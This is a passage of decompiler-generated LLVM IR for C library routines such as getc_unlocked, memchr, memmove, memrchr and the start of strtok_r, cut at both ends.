  uselistorder label %dec_label_pc_805232f, { 1, 0 }
  uselistorder label %dec_label_pc_8052324, { 1, 0 }
  uselistorder label %dec_label_pc_80522ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805229d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052263, { 1, 0 }
  uselistorder label %dec_label_pc_8052233.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_80521ff, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80521ce, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80521b9, { 1, 0 }
  uselistorder label %dec_label_pc_8052070, { 1, 0 }
  uselistorder label %dec_label_pc_8051f94, { 1, 0 }
  uselistorder label %dec_label_pc_8051f8b, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8052508 = load i32, i32* @ebx, align 4
  %v4_805250c = ptrtoint i16* %tmp to i32
  store i32 %v4_805250c, i32* @ebx, align 4
  %v1_8052510 = add i32 %v4_805250c, 16
  %v2_8052510 = inttoptr i32 %v1_8052510 to i32*
  %v3_8052510 = load i32, i32* %v2_8052510, align 4
  %v2_8052513 = add i32 %v4_805250c, 24
  %v3_8052513 = inttoptr i32 %v2_8052513 to i32*
  %v4_8052513 = load i32, i32* %v3_8052513, align 4
  %v10_8052513 = icmp ult i32 %v3_8052510, %v4_8052513
  br i1 %v10_8052513, label %dec_label_pc_80525b5, label %dec_label_pc_805251c

dec_label_pc_805251c:                             ; preds = %entry
  %v2_805251c = load i16, i16* %tmp, align 2
  %v3_805251c = zext i16 %v2_805251c to i32
  %v1_805251f = and i32 %v3_805251c, 131
  %v6_8052529 = icmp ugt i32 %v1_805251f, 128
  br i1 %v6_8052529, label %dec_label_pc_8052543, label %dec_label_pc_805252b

dec_label_pc_805252b:                             ; preds = %dec_label_pc_805251c
  %v0_805252b = load i32, i32* @edx, align 4
  %v6_8052533 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_805252b, i32 %v0_805252b)
  %v1_805253b = icmp eq i32 %v6_8052533, 0
  %v1_805253d = icmp eq i1 %v1_805253b, false
  br i1 %v1_805253d, label %dec_label_pc_80525da, label %dec_label_pc_805252b.dec_label_pc_8052543_crit_edge

dec_label_pc_805252b.dec_label_pc_8052543_crit_edge: ; preds = %dec_label_pc_805252b
  %v0_8052543.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052543

dec_label_pc_8052543:                             ; preds = %dec_label_pc_805252b.dec_label_pc_8052543_crit_edge, %dec_label_pc_805251c
  %v2_8052577 = phi i32 [ %v0_8052543.pre, %dec_label_pc_805252b.dec_label_pc_8052543_crit_edge ], [ %v4_805250c, %dec_label_pc_805251c ]
  %v1_8052543 = inttoptr i32 %v2_8052577 to i32*
  %v2_8052543 = load i32, i32* %v1_8052543, align 4
  store i32 %v2_8052543, i32* @ecx, align 4
  %v1_8052545 = urem i32 %v2_8052543, 65536
  store i32 %v1_8052545, i32* %edx.global-to-local, align 4
  %v2_8052548 = and i32 %v2_8052543, 2
  %v3_8052548 = icmp eq i32 %v2_8052548, 0
  br i1 %v3_8052548, label %dec_label_pc_8052566, label %dec_label_pc_805254d

dec_label_pc_805254d:                             ; preds = %dec_label_pc_8052543
  %v1_805254d = urem i32 %v2_8052543, 2
  store i32 %v1_805254d, i32* %edx.global-to-local, align 4
  %v1_8052550 = add i32 %v2_8052543, 65535
  %v1_8052553 = trunc i32 %v1_8052550 to i16
  %v3_8052553 = inttoptr i32 %v2_8052577 to i16*
  store i16 %v1_8052553, i16* %v3_8052553, align 2
  %v0_8052556 = load i32, i32* @ebx, align 4
  %v1_8052556 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052556 = mul i32 %v1_8052556, 4
  %v3_8052556 = add i32 %v0_8052556, 36
  %v4_8052556 = add i32 %v3_8052556, %v2_8052556
  %v5_8052556 = inttoptr i32 %v4_8052556 to i8*
  %v6_8052556 = load i8, i8* %v5_8052556, align 1
  %v7_8052556 = zext i8 %v6_8052556 to i32
  %v9_8052556 = and i32 %v1_8052556, -256
  %v10_8052556 = or i32 %v7_8052556, %v9_8052556
  store i32 %v10_8052556, i32* %edx.global-to-local, align 4
  %v1_805255a = add i32 %v0_8052556, 40
  %v2_805255a = inttoptr i32 %v1_805255a to i32*
  store i32 0, i32* %v2_805255a, align 4
  %v0_8052561 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052561 = urem i32 %v0_8052561, 256
  store i32 %v1_8052561, i32* @edx, align 4
  br label %dec_label_pc_80525dd

dec_label_pc_8052566:                             ; preds = %dec_label_pc_8052543
  %v1_8052566 = add i32 %v2_8052577, 16
  %v2_8052566 = inttoptr i32 %v1_8052566 to i32*
  %v3_8052566 = load i32, i32* %v2_8052566, align 4
  store i32 %v3_8052566, i32* @eax, align 4
  %v1_8052569 = add i32 %v2_8052577, 20
  %v2_8052569 = inttoptr i32 %v1_8052569 to i32*
  %v3_8052569 = load i32, i32* %v2_8052569, align 4
  %v15_8052569 = icmp eq i32 %v3_8052569, %v3_8052566
  %v1_805256c = icmp eq i1 %v15_8052569, false
  br i1 %v1_805256c, label %dec_label_pc_80525b5, label %dec_label_pc_805256e

dec_label_pc_805256e:                             ; preds = %dec_label_pc_8052566
  %v1_805256e = add i32 %v2_8052577, 4
  %v2_805256e = inttoptr i32 %v1_805256e to i32*
  %v3_805256e = load i32, i32* %v2_805256e, align 4
  %v13_805256e = icmp eq i32 %v3_805256e, -2
  %v1_8052572 = icmp eq i1 %v13_805256e, false
  br i1 %v1_8052572, label %dec_label_pc_805257c, label %dec_label_pc_8052574

dec_label_pc_8052574:                             ; preds = %dec_label_pc_805256e
  %v1_8052574 = or i32 %v2_8052543, 4
  store i32 %v1_8052574, i32* @ecx, align 4
  %v1_8052577 = trunc i32 %v1_8052574 to i16
  %v3_8052577 = inttoptr i32 %v2_8052577 to i16*
  store i16 %v1_8052577, i16* %v3_8052577, align 2
  br label %dec_label_pc_80525da

dec_label_pc_805257c:                             ; preds = %dec_label_pc_805256e
  %v1_805257c = udiv i32 %v2_8052543, 256
  %v2_805257c = trunc i32 %v1_805257c to i8
  %v3_805257c = urem i8 %v2_805257c, 4
  %v4_805257c = icmp eq i8 %v3_805257c, 0
  %v8_805257c = zext i8 %v3_805257c to i32
  %v10_805257c = mul nuw nsw i32 %v8_805257c, 256
  %v11_805257c = urem i32 %v2_8052543, 256
  %v12_805257c = or i32 %v10_805257c, %v11_805257c
  store i32 %v12_805257c, i32* %edx.global-to-local, align 4
  br i1 %v4_805257c, label %dec_label_pc_8052591, label %dec_label_pc_8052581

dec_label_pc_8052581:                             ; preds = %dec_label_pc_805257c
  %v3_8052589 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8058238.190 to i16*))
  %v0_8052591.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052591

dec_label_pc_8052591:                             ; preds = %dec_label_pc_805257c, %dec_label_pc_8052581
  %v0_80525c6 = phi i32 [ %v2_8052577, %dec_label_pc_805257c ], [ %v0_8052591.pre, %dec_label_pc_8052581 ]
  %v1_8052591 = add i32 %v0_80525c6, 8
  %v2_8052591 = inttoptr i32 %v1_8052591 to i32*
  %v3_8052591 = load i32, i32* %v2_8052591, align 4
  %v1_8052594 = add i32 %v0_80525c6, 12
  %v2_8052594 = inttoptr i32 %v1_8052594 to i32*
  %v3_8052594 = load i32, i32* %v2_8052594, align 4
  %v15_8052594 = icmp eq i32 %v3_8052594, %v3_8052591
  br i1 %v15_8052594, label %dec_label_pc_80525be, label %dec_label_pc_8052599

dec_label_pc_8052599:                             ; preds = %dec_label_pc_8052591
  %v2_805259c = add i32 %v0_80525c6, 24
  %v3_805259c = inttoptr i32 %v2_805259c to i32*
  store i32 %v3_8052591, i32* %v3_805259c, align 4
  %v0_805259f = load i32, i32* @ebx, align 4
  %v2_80525a0 = call i32 @__stdio_rfill(i32 %v0_805259f)
  %v1_80525a8 = icmp eq i32 %v2_80525a0, 0
  br i1 %v1_80525a8, label %dec_label_pc_80525da, label %dec_label_pc_80525ac

dec_label_pc_80525ac:                             ; preds = %dec_label_pc_8052599
  %v0_80525ac = load i32, i32* @ebx, align 4
  %v1_80525ac = add i32 %v0_80525ac, 20
  %v2_80525ac = inttoptr i32 %v1_80525ac to i32*
  %v3_80525ac = load i32, i32* %v2_80525ac, align 4
  %v2_80525af = add i32 %v0_80525ac, 24
  %v3_80525af = inttoptr i32 %v2_80525af to i32*
  store i32 %v3_80525ac, i32* %v3_80525af, align 4
  %v0_80525b2 = load i32, i32* @ebx, align 4
  %v1_80525b2 = add i32 %v0_80525b2, 16
  %v2_80525b2 = inttoptr i32 %v1_80525b2 to i32*
  %v3_80525b2 = load i32, i32* %v2_80525b2, align 4
  br label %dec_label_pc_80525b5

dec_label_pc_80525b5:                             ; preds = %dec_label_pc_8052566, %entry, %dec_label_pc_80525ac
  %v1_80525b9 = phi i32 [ %v2_8052577, %dec_label_pc_8052566 ], [ %v4_805250c, %entry ], [ %v0_80525b2, %dec_label_pc_80525ac ]
  %v0_80525b5 = phi i32 [ %v3_8052566, %dec_label_pc_8052566 ], [ %v3_8052510, %entry ], [ %v3_80525b2, %dec_label_pc_80525ac ]
  %v1_80525b5 = inttoptr i32 %v0_80525b5 to i8*
  %v2_80525b5 = load i8, i8* %v1_80525b5, align 1
  %v3_80525b5 = zext i8 %v2_80525b5 to i32
  store i32 %v3_80525b5, i32* @edx, align 4
  %v1_80525b8 = add i32 %v0_80525b5, 1
  %v2_80525b9 = add i32 %v1_80525b9, 16
  %v3_80525b9 = inttoptr i32 %v2_80525b9 to i32*
  store i32 %v1_80525b8, i32* %v3_80525b9, align 4
  %v0_80525dd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80525dd

dec_label_pc_80525be:                             ; preds = %dec_label_pc_8052591
  %v2_80525c1 = ptrtoint i8* %stack_var_-5 to i32
  %v5_80525c6 = inttoptr i32 %v0_80525c6 to i16*
  %v5_80525c7 = call i32 @__stdio_READ(i16* %v5_80525c6, i32 %v2_80525c1, i32 1)
  %v1_80525cf = icmp eq i32 %v5_80525c7, 0
  br i1 %v1_80525cf, label %dec_label_pc_80525da, label %dec_label_pc_80525d3

dec_label_pc_80525d3:                             ; preds = %dec_label_pc_80525be
  %v3_80525d3 = load i8, i8* %stack_var_-5, align 1
  %v4_80525d3 = sext i8 %v3_80525d3 to i32
  store i32 %v4_80525d3, i32* @edx, align 4
  br label %dec_label_pc_80525dd

dec_label_pc_80525da:                             ; preds = %dec_label_pc_805252b, %dec_label_pc_80525be, %dec_label_pc_8052599, %dec_label_pc_8052574
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_80525dd

dec_label_pc_80525dd:                             ; preds = %dec_label_pc_805254d, %dec_label_pc_80525d3, %dec_label_pc_80525b5, %dec_label_pc_80525da
  %v0_80525dd = phi i32 [ %v1_8052561, %dec_label_pc_805254d ], [ %v4_80525d3, %dec_label_pc_80525d3 ], [ %v0_80525dd.pre, %dec_label_pc_80525b5 ], [ -1, %dec_label_pc_80525da ]
  store i32 %v0_8052508, i32* @ebx, align 4
  ret i32 %v0_80525dd

; uselistorder directives
  uselistorder i32 %v0_80525b5, { 1, 0 }
  uselistorder i32 %v3_8052591, { 1, 0 }
  uselistorder i32 %v0_80525c6, { 0, 1, 3, 2 }
  uselistorder i8 %v3_805257c, { 1, 0 }
  uselistorder i32 %v3_8052566, { 1, 0, 2 }
  uselistorder i32 %v1_8052561, { 1, 0 }
  uselistorder i32 %v2_8052543, { 1, 0, 4, 5, 2, 6, 3, 7 }
  uselistorder i32 %v2_8052577, { 0, 1, 2, 3, 5, 4, 6, 7 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 (i16*)* @fflush_unlocked, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_80525dd, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80525da, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80525b5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052591, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_80525e4 = load i32, i32* @edi, align 4
  store i32 %v0_80525e4, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_80525eb = ptrtoint i8* %arg1 to i32
  store i32 %v4_80525eb, i32* %edi.global-to-local, align 4
  %v1_80525f3 = icmp eq i32 %arg3, 0
  store i1 %v1_80525f3, i1* %zf.global-to-local, align 1
  br i1 %v1_80525f3, label %dec_label_pc_8052603, label %dec_label_pc_80525f7

dec_label_pc_80525f7:                             ; preds = %entry
  %v2_80525f7 = call i32 @_strlen(i8* %arg1)
  %v3_80525f7 = mul i32 %v2_80525f7, -1
  %v4_80525f7 = add i32 %v3_80525f7, -2
  store i32 %v4_80525f7, i32* @ecx, align 4
  %v0_80525f9 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80525f9, label %dec_label_pc_80525f7.dec_label_pc_8052600_crit_edge, label %dec_label_pc_80525fb

dec_label_pc_80525f7.dec_label_pc_8052600_crit_edge: ; preds = %dec_label_pc_80525f7
  %v0_8052600.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8052600.pre, -1
  br label %dec_label_pc_8052600

dec_label_pc_80525fb:                             ; preds = %dec_label_pc_80525f7
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052600

dec_label_pc_8052600:                             ; preds = %dec_label_pc_80525f7.dec_label_pc_8052600_crit_edge, %dec_label_pc_80525fb
  %v0_8052600 = phi i32 [ %phitmp, %dec_label_pc_80525f7.dec_label_pc_8052600_crit_edge ], [ 0, %dec_label_pc_80525fb ]
  %v8_8052600 = icmp eq i32 %v0_8052600, 0
  store i1 %v8_8052600, i1* %zf.global-to-local, align 1
  store i32 %v0_8052600, i32* %edi.global-to-local, align 4
  %v2_8052605.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052603

dec_label_pc_8052603:                             ; preds = %entry, %dec_label_pc_8052600
  %v2_8052605 = phi i32 [ %v0_80525e4, %entry ], [ %v2_8052605.pre, %dec_label_pc_8052600 ]
  %v0_8052603 = phi i32 [ 0, %entry ], [ %v0_8052600, %dec_label_pc_8052600 ]
  store i32 %v2_8052605, i32* @edi, align 4
  ret i32 %v0_8052603

; uselistorder directives
  uselistorder i32 %v0_8052600, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8052603, { 1, 0 }
  uselistorder label %dec_label_pc_8052600, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8052609 = load i32, i32* @esi, align 4
  store i32 %v0_8052609, i32* %stack_var_-8, align 4
  %v4_805260a = ptrtoint i8* %arg1 to i32
  %v9_8052616 = icmp ugt i8* %tmp3, %arg1
  %v1_8052618 = icmp eq i1 %v9_8052616, false
  br i1 %v1_8052618, label %dec_label_pc_8052620, label %dec_label_pc_805261a

dec_label_pc_805261a:                             ; preds = %entry
  %v7_805261c = call i8* @_memcpy(i8* %arg1, i8* %tmp3, i32 %tmp)
  br label %dec_label_pc_805262c

dec_label_pc_8052620:                             ; preds = %entry
  %v3_8052620 = add i32 %arg2, -1
  %v4_8052620 = add i32 %v3_8052620, %tmp
  %v5_8052620 = inttoptr i32 %v4_8052620 to i8*
  %v3_8052624 = add i32 %v4_805260a, -1
  %v4_8052624 = add i32 %v3_8052624, %tmp
  %v5_8052624 = inttoptr i32 %v4_8052624 to i8*
  %v7_8052629 = call i8* @_memcpy(i8* %v5_8052624, i8* %v5_8052620, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_805262c

dec_label_pc_805262c:                             ; preds = %dec_label_pc_805261a, %dec_label_pc_8052620
  %v2_805262c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805262c, i32* @esi, align 4
  ret i32 %v4_805260a

; uselistorder directives
  uselistorder i8* %tmp3, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805262c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8052630 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8052643 = inttoptr i32 %arg1 to i16*
  %v4_8052643 = call i32 @memcpy(i16* %v3_8052643, i32 %arg2, i32 %arg3)
  %v0_8052648 = load i32, i32* @esi, align 4
  %v2_8052648 = add i32 %v0_8052648, %arg3
  store i32 %v0_8052630, i32* @esi, align 4
  ret i32 %v2_8052648
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8052659 = urem i32 %arg2, 256
  %v4_8052665 = sext i8 %arg1 to i32
  %v2_8052669 = add i32 %v4_8052665, %arg3
  %v1_805267b7 = icmp eq i32 %arg3, 0
  br i1 %v1_805267b7, label %dec_label_pc_8052683, label %dec_label_pc_805267f

dec_label_pc_805266d:                             ; preds = %dec_label_pc_805267f
  %v1_805266d = add i32 %v0_805266d, -1
  %v5_805266e = load i32, i32* @edx, align 4
  %v6_805266e = and i32 %v5_805266e, -256
  %v7_805266e = or i32 %v6_805266e, %v4_8052659
  store i32 %v7_805266e, i32* @edx, align 4
  %v1_8052672 = inttoptr i32 %v1_805266d to i8*
  %v2_8052672 = load i8, i8* %v1_8052672, align 1
  %v15_8052672 = icmp eq i8 %v2_8052672, %tmp
  br i1 %v15_8052672, label %dec_label_pc_8052700, label %dec_label_pc_805267a

dec_label_pc_805267a:                             ; preds = %dec_label_pc_805266d
  %v1_805267a = add i32 %v0_805267a, -1
  %v8_805267a = icmp eq i32 %v1_805267a, 0
  br i1 %v8_805267a, label %dec_label_pc_8052683, label %dec_label_pc_805267f

dec_label_pc_805267f:                             ; preds = %entry, %dec_label_pc_805267a
  %v0_805267a = phi i32 [ %v1_805267a, %dec_label_pc_805267a ], [ %arg3, %entry ]
  %v0_805266d = phi i32 [ %v1_805266d, %dec_label_pc_805267a ], [ %v2_8052669, %entry ]
  %v2_805267f = urem i32 %v0_805266d, 4
  %v3_805267f = icmp eq i32 %v2_805267f, 0
  %v1_8052681 = icmp eq i1 %v3_805267f, false
  br i1 %v1_8052681, label %dec_label_pc_805266d, label %dec_label_pc_8052683

dec_label_pc_8052683:                             ; preds = %dec_label_pc_805267a, %dec_label_pc_805267f, %entry
  %v0_80526e6.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_805267a ], [ %v0_805267a, %dec_label_pc_805267f ]
  %v0_8052688 = phi i32 [ %v2_8052669, %entry ], [ %v1_805266d, %dec_label_pc_805267a ], [ %v0_805266d, %dec_label_pc_805267f ]
  store i32 %v0_8052688, i32* @ecx, align 4
  %v2_805268c = mul nuw nsw i32 %v4_8052659, 256
  %v2_805268f = or i32 %v2_805268c, %v4_8052659
  %v2_8052693 = mul i32 %v2_805268f, 65536
  %v2_8052696 = or i32 %v2_8052693, %v2_805268f
  %v6_80526e950 = icmp ugt i32 %v0_80526e6.pr, 3
  br i1 %v6_80526e950, label %dec_label_pc_805269a, label %dec_label_pc_80526eb

dec_label_pc_805269a:                             ; preds = %dec_label_pc_8052683, %dec_label_pc_80526e3
  %v0_80526e352 = phi i32 [ %v1_80526e3, %dec_label_pc_80526e3 ], [ %v0_80526e6.pr, %dec_label_pc_8052683 ]
  %v0_805269a51 = phi i32 [ %v1_805269a, %dec_label_pc_80526e3 ], [ %v0_8052688, %dec_label_pc_8052683 ]
  %v1_805269a = add i32 %v0_805269a51, -4
  store i32 %v1_805269a, i32* @ecx, align 4
  %v2_805269f = inttoptr i32 %v1_805269a to i32*
  %v3_805269f = load i32, i32* %v2_805269f, align 4
  %v4_805269f = xor i32 %v3_805269f, %v2_8052696
  %v1_80526a1 = add i32 %v4_805269f, 2130640639
  %v1_80526a7 = sub i32 -1, %v4_805269f
  %v2_80526a9 = xor i32 %v1_80526a1, %v1_80526a7
  %v1_80526ab = and i32 %v2_80526a9, -2130640640
  %v2_80526ab = icmp eq i32 %v1_80526ab, 0
  br i1 %v2_80526ab, label %dec_label_pc_80526e3, label %dec_label_pc_80526b3

dec_label_pc_80526b3:                             ; preds = %dec_label_pc_805269a
  %v7_80526b3 = or i32 %v1_80526ab, %v4_8052659
  %v1_80526b7 = add i32 %v0_805269a51, -1
  %v2_80526ba = inttoptr i32 %v1_80526b7 to i8*
  %v3_80526ba = load i8, i8* %v2_80526ba, align 1
  %v16_80526ba = icmp eq i8 %v3_80526ba, %tmp
  br i1 %v16_80526ba, label %dec_label_pc_8052700, label %dec_label_pc_80526bf

dec_label_pc_80526bf:                             ; preds = %dec_label_pc_80526b3
  %v1_80526c3 = add i32 %v0_805269a51, -2
  %v2_80526c6 = inttoptr i32 %v1_80526c3 to i8*
  %v3_80526c6 = load i8, i8* %v2_80526c6, align 1
  %v16_80526c6 = icmp eq i8 %v3_80526c6, %tmp
  br i1 %v16_80526c6, label %dec_label_pc_8052700, label %dec_label_pc_80526cb

dec_label_pc_80526cb:                             ; preds = %dec_label_pc_80526bf
  %v1_80526cf = add i32 %v0_805269a51, -3
  %v2_80526d2 = inttoptr i32 %v1_80526cf to i8*
  %v3_80526d2 = load i8, i8* %v2_80526d2, align 1
  %v16_80526d2 = icmp eq i8 %v3_80526d2, %tmp
  br i1 %v16_80526d2, label %dec_label_pc_8052700, label %dec_label_pc_80526d7

dec_label_pc_80526d7:                             ; preds = %dec_label_pc_80526cb
  %v1_80526db = inttoptr i32 %v1_805269a to i8*
  %v2_80526db = load i8, i8* %v1_80526db, align 1
  %v15_80526db = icmp eq i8 %v2_80526db, %tmp
  %v1_80526dd = icmp eq i1 %v15_80526db, false
  br i1 %v1_80526dd, label %dec_label_pc_80526e3, label %dec_label_pc_80526df

dec_label_pc_80526df:                             ; preds = %dec_label_pc_80526d7
  br label %dec_label_pc_8052700

dec_label_pc_80526e3:                             ; preds = %dec_label_pc_80526d7, %dec_label_pc_805269a
  %v5_80526f027 = phi i32 [ %v7_80526b3, %dec_label_pc_80526d7 ], [ 0, %dec_label_pc_805269a ]
  %v1_80526e3 = add i32 %v0_80526e352, -4
  %v6_80526e9 = icmp ugt i32 %v1_80526e3, 3
  br i1 %v6_80526e9, label %dec_label_pc_805269a, label %dec_label_pc_80526eb

dec_label_pc_80526eb:                             ; preds = %dec_label_pc_80526e3, %dec_label_pc_8052683
  %v5_80526f026.lcssa = phi i32 [ %v4_8052659, %dec_label_pc_8052683 ], [ %v5_80526f027, %dec_label_pc_80526e3 ]
  %v0_805269a.lcssa = phi i32 [ %v0_8052688, %dec_label_pc_8052683 ], [ %v1_805269a, %dec_label_pc_80526e3 ]
  %v0_80526e3.lcssa = phi i32 [ %v0_80526e6.pr, %dec_label_pc_8052683 ], [ %v1_80526e3, %dec_label_pc_80526e3 ]
  br label %dec_label_pc_80526f8

dec_label_pc_80526ef:                             ; preds = %dec_label_pc_80526f8
  %v1_80526f8 = add i32 %v0_80526f8, -1
  %v1_80526ef = add i32 %v0_80526ef, -1
  %v6_80526f0 = and i32 %v5_80526f0, -256
  %v7_80526f0 = or i32 %v6_80526f0, %v4_8052659
  %v1_80526f4 = inttoptr i32 %v1_80526ef to i8*
  %v2_80526f4 = load i8, i8* %v1_80526f4, align 1
  %v15_80526f4 = icmp eq i8 %v2_80526f4, %tmp
  br i1 %v15_80526f4, label %dec_label_pc_8052700, label %dec_label_pc_80526f8

dec_label_pc_80526f8:                             ; preds = %dec_label_pc_80526ef, %dec_label_pc_80526eb
  %v5_80526f0 = phi i32 [ %v7_80526f0, %dec_label_pc_80526ef ], [ %v5_80526f026.lcssa, %dec_label_pc_80526eb ]
  %v0_80526ef = phi i32 [ %v1_80526ef, %dec_label_pc_80526ef ], [ %v0_805269a.lcssa, %dec_label_pc_80526eb ]
  %v0_80526f8 = phi i32 [ %v1_80526f8, %dec_label_pc_80526ef ], [ %v0_80526e3.lcssa, %dec_label_pc_80526eb ]
  %v10_80526f9 = icmp eq i32 %v0_80526f8, 0
  %v1_80526fc = icmp eq i1 %v10_80526f9, false
  br i1 %v1_80526fc, label %dec_label_pc_80526ef, label %dec_label_pc_80526fe

dec_label_pc_80526fe:                             ; preds = %dec_label_pc_80526f8
  br label %dec_label_pc_8052700

dec_label_pc_8052700:                             ; preds = %dec_label_pc_805266d, %dec_label_pc_80526cb, %dec_label_pc_80526bf, %dec_label_pc_80526b3, %dec_label_pc_80526ef, %dec_label_pc_80526df, %dec_label_pc_80526fe
  %v0_8052703 = phi i32 [ %v1_805269a, %dec_label_pc_80526df ], [ 0, %dec_label_pc_80526fe ], [ %v1_80526ef, %dec_label_pc_80526ef ], [ %v1_80526cf, %dec_label_pc_80526cb ], [ %v1_80526c3, %dec_label_pc_80526bf ], [ %v1_80526b7, %dec_label_pc_80526b3 ], [ %v1_805266d, %dec_label_pc_805266d ]
  ret i32 %v0_8052703

; uselistorder directives
  uselistorder i32 %v0_80526f8, { 1, 0 }
  uselistorder i32 %v1_80526e3, { 0, 2, 1 }
  uselistorder i32 %v1_805269a, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805269a51, { 3, 2, 1, 0 }
  uselistorder i32 %v2_805268f, { 1, 0 }
  uselistorder i32 %v0_805266d, { 1, 0, 2 }
  uselistorder i32 %v2_8052669, { 1, 0 }
  uselistorder i32 %v4_8052659, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 -2, { 2, 7, 0, 16, 17, 1, 15, 19, 14, 20, 3, 5, 4, 21, 8, 9, 10, 18, 11, 12, 6, 13 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052700, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805269a, { 1, 0 }
  uselistorder label %dec_label_pc_8052683, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805267f, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052704 = load i32, i32* @edi, align 4
  %v0_8052705 = load i32, i32* @esi, align 4
  %v0_8052706 = load i32, i32* @ebx, align 4
  store i32 %v0_8052706, i32* %stack_var_-12, align 4
  %v4_8052707 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052707, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8052713 = icmp eq i8* %arg1, null
  %v1_8052715 = icmp eq i1 %v1_8052713, false
  br i1 %v1_8052715, label %dec_label_pc_8052719, label %dec_label_pc_8052717

dec_label_pc_8052717:                             ; preds = %entry
  %v1_8052717 = inttoptr i32 %arg3 to i32*
  %v2_8052717 = load i32, i32* %v1_8052717, align 4
  store i32 %v2_8052717, i32* @ebx, align 4
  br label %dec_label_pc_8052719

dec_label_pc_8052719:                             ; preds = %entry, %dec_label_pc_8052717
  %v0_805271c = phi i32 [ %v4_8052707, %entry ], [ %v2_8052717, %dec_label_pc_8052717 ]
  %v0_8052719 = load i32, i32* @ecx, align 4
  %v5_805271c = inttoptr i32 %v0_805271c to i8*
  %v8_805271d = call i32 @__GI_strspn(i8* %v5_805271c, i32 %arg2, i32 %v0_8052719, i32 %v0_8052719)
  store i32 %v8_805271d, i32* %eax.global-to-local, align 4
  %v0_8052725 = load i32, i32* @ebx, align 4
  %v2_8052725 = add i32 %v0_8052725, %v8_805271d
  store i32 %v2_8052725, i32* @ebx, align 4
  %v1_8052727 = inttoptr i32 %v2_8052725 to i8*
  %v2_8052727 = load i8, i8* %v1_8052727, align 1
  %v3_8052727 = icmp eq i8 %v2_8052727, 0
  %v1_805272a = icmp eq i1 %v3_8052727, false
  br i1 %v1_805272a, label %dec_label_pc_8052732, label %dec_label_pc_805272c

dec_label_pc_805272c:                             ; preds = %dec_label_pc_8052719
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805272e = load i32, i32* @esi, align 4
  %v2_805272e = inttoptr i32 %v1_805272e to i32*
  store i32 %v2_8052725, i32* %v2_805272e, align 4
  %v0_805275c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052759

dec_label_pc_8052732:                             ; preds = %dec_label_pc_8052719
  %v0_8052732 = load i32, i32* @edx, align 4
  %v0_8052734 = load i32, i32* @edi, align 4
  %v8_8052736 = call i32 @__GI_strpbrk(i8* %v1_8052727, i32 %v0_8052734, i32 %v0_8052732, i32 %v0_8052732)
  store i32 %v8_8052736, i32* %eax.global-to-local, align 4
  %v2_805273e = icmp eq i32 %v8_8052736, 0
  %v1_8052740 = icmp eq i1 %v2_805273e, false
  br i1 %v1_8052740, label %dec_label_pc_8052751, label %dec_label_pc_8052742

dec_label_pc_8052742:                             ; preds = %dec_label_pc_8052732
  %v0_8052746 = load i32, i32* @ebx, align 4
  %v5_8052746 = inttoptr i32 %v0_8052746 to i8*
